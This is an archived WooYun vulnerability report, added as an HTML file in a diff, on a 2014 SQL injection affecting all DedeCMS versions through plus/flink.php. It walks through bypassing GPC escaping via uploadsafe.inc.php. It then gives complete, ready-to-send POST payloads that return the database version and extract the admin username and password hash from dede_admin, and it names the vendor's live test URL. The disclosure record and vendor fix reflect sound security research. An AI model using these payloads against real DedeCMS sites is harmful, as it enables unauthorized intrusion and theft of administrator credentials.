@@ -1,0 +1,284 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		DedeCMS全版本通杀SQL注入(真正的无任何限制附官方测试结果)  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		DedeCMS全版本通杀SQL注入(真正的无任何限制附官方测试结果)  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/kobin97">kobin97</a> 
+</li><li>提交时间：		2014-02-25 10:35</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-02-25：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-02-25：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-02-28：	细节向第三方安全合作伙伴开放<br/>
+									2014-03-07：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-03-17：	细节向普通白帽子公开<br/>
+									2014-04-06：	细节向实习白帽子公开<br/>
+									2014-05-26：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">最近很多人刷dedecms的漏洞，个人表示很无语。<br />
+粗略看了下,这些洞存在太大限制 <br />
+一句话总结：只要会员中心一关，全部没法用...<br />
+试问现在哪个傻子会开会员中心... 默认都是关闭的,所以哪...<br />
+今天这个洞，无视会员中心，无视GPC，会员中心，GPC你哪凉快 哪呆着去，默认安装就能利用哦...<br />
+也一句话总结：架构问题才是真问题。<br />
+<br />
+（ps:调皮一下^-^，felixk3y某见怪，话说这个漏洞跨越了多个版本，不知会不会打雷。）</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">首先，我们来看看dede重要文件 common.inc.php<br />
+<br />
+这里开始过滤得很完整，往下看<br />
+<br />
+//转换上传的文件相关的变量及安全处理、并引用前台通用的上传函数<br />
+<br />
+</p><pre><code>if($_FILES)<br />
+{<br />
+    require_once(DEDEINC.&#039;/uploadsafe.inc.php&#039;);<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+我看再看：uploadsafe.inc.php<br />
+<br />
+</p><pre><code>//29行<br />
+    $$_key = $_FILES[$_key][&#039;tmp_name&#039;] = str_replace(&quot;\\\\&quot;, &quot;\\&quot;, $_FILES[$_key][&#039;tmp_name&#039;]);</code></pre><p class='detail'><br />
+<br />
+看到这里，我笑了。<br />
+<br />
+这不是能绕过 GPC的节奏么。<br />
+<br />
+<br />
+<br />
+好吧，随便找一个能添加数据的地方<br />
+<br />
+于是找到了<br />
+<br />
+plus\flink.php<br />
+<br />
+<br />
+<br />
+虽然都经过 htmlspecialchars <br />
+<br />
+我们看看：<br />
+<br />
+htmlspecialchars(string,quotestyle,character-set)<br />
+<br />
+ 	<br />
+<br />
+<br />
+<br />
+可选。规定如何编码单引号和双引号。<br />
+<br />
+    ENT_COMPAT - 默认。仅编码双引号。<br />
+<br />
+    ENT_QUOTES - 编码双引号和单引号。<br />
+<br />
+    ENT_NOQUOTES - 不编码任何引号。<br />
+<br />
+默认情况下仅编码双引号。<br />
+<br />
+<br />
+<br />
+这里不是重点，不过也是能利用的条件之一，用于绕过dede自带的ids。<br />
+<br />
+构造webname 值为：<br />
+<br />
+</p><pre><code>&amp;_FILES[webname][name]=1.gif&amp;_FILES[webname][type]=image/gifx&amp;_FILES[webname][size]=10&amp;&amp;_FILES[webname][tmp_name]=pass\</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+这里解释一下，经过GPC后 webname 变为 pass\\<br />
+<br />
+经过刚才 uploadsafe.inc.php 的函数后 <br />
+<br />
+webname 变为 pass\<br />
+<br />
+<br />
+<br />
+插入到SQL语句中就变成了<br />
+<br />
+</p><pre><code>INSERT INTO `#@__flink`(sortrank,url,webname,logo,msg,email,typeid,dtime,ischeck) VALUES(&#039;50&#039;,&#039;http://&#039;,&#039;pass\&#039;,&#039;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+即吃掉了后面的 &#039; ，从而实现绕过GPC。<br />
+<br />
+不过ExecuteNoneQuery不支持错误回显，那我们就构造好，让他显示出来吧。于是后面的logo函数就变成：<br />
+<br />
+logo=,if(@`&#039;`,0x7c,(select version())),1,1,1,1,1)#,@`&#039;`<br />
+<br />
+<br />
+<br />
+ischeck 为1即绕过审核，结果直接显示出来。<br />
+<br />
+<br />
+<br />
+完整参数为：<br />
+<br />
+查版本：<br />
+<br />
+</p><pre><code>Submit=%20%E6%8F%90%20%E4%BA%A4%20&amp;dopost=save&amp;email=&amp;logo=,if(@`&#039;`,0x7c,(select version())),1,1,1,1,1)#,@`&#039;`&amp;typeid=1&amp;url=http%3A%2F%2F&amp;validate=spen&amp;_FILES[webname][name]=1.gif&amp;_FILES[webname][type]=image/gifx&amp;_FILES[webname][size]=10&amp;&amp;_FILES[webname][tmp_name]=pass\</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+查密码：<br />
+<br />
+</p><pre><code>Submit=%20%E6%8F%90%20%E4%BA%A4%20&amp;dopost=save&amp;email=&amp;logo=,if(@`&#039;`,0x7c,(select concat(userid,0x7c,pwd) from dede_admin limit 0,1)),1,1,1,1,1)#,@`&#039;`&amp;typeid=1&amp;url=http%3A%2F%2F&amp;validate=spen&amp;_FILES[webname][name]=1.gif&amp;_FILES[webname][type]=image/gifx&amp;_FILES[webname][size]=10&amp;&amp;_FILES[webname][tmp_name]=pass\</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+验证码字段自己修改。。。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/251032195f50c560870c6d11b3870b1d97013fcc.jpg" target="_blank"><img src="../images/251032195f50c560870c6d11b3870b1d97013fcc.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/2510323488ffcb2474cfeb61e092b786d878a537.jpg" target="_blank"><img src="../images/2510323488ffcb2474cfeb61e092b786d878a537.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+官方测试地址：<br />
+<br />
+http://help.dedecms.com/plus/flink.php<br />
+<br />
+</p><p class="detail"><a href="../images/25104200f25f357101c7489af3eb80eaf8ecc696.jpg" target="_blank"><img src="../images/25104200f25f357101c7489af3eb80eaf8ecc696.jpg" alt="111.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">调整架构！ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/kobin97" title="kobin97">kobin97</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-051950" title="DedeCMS全版本通杀SQL注入(真正的无任何限制附官方测试结果)">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：8 </p>
+													<p class="detail">确认时间：2014-02-25 13:10</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">已经修复</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="51950";
+var bugRating="-3";
+var myRating="";
+var ratingCount="1";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
